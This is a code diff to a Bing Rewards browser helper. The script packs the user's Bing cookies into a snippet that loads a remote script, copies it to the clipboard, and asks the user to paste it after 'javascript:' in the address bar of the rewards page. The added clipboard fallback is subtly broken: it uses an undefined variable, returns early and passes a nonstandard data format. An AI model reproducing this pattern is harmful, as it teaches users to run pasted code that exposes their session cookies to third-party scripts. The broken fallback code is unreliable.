@@ -11,6 +11,28 @@ if(window.location.href.includes("bing.com")){
     }else{
         var codeForRewards = 'document.body.appendChild(Object.assign(document.createElement("script"),{src:"https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/web.js"}));bing="'
         +document.cookie+'"';
+        if (window.clipboardData && window.clipboardData.setData) {
+            // IE: prevent textarea being shown while dialog is visible
+            return window.clipboardData.setData("Code for Rewards page", codeForRewards);
+        
+          } else if (document.queryCommandSupported && 
+                     document.queryCommandSupported("copy")) {
+            var textarea = document.createElement("textarea");
+            textarea.textContent = text;
+            // Prevent scrolling to bottom of page in MS Edge
+            textarea.style.position = "fixed";
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+              // Security exception may be thrown by some browsers
+              return document.execCommand("copy");
+            } catch (ex) {
+              console.warn("Copy to clipboard failed.", ex);
+              return false;
+            } finally {
+              document.body.removeChild(textarea);
+            }
+          }
         navigator.clipboard.writeText(codeForRewards)
         if(confirm('The code for Points Breakdown page have been copied. On the next page, paste after typing "javascript:" at the url bar.')){
             window.open("https://rewards.bing.com/pointsbreakdown")
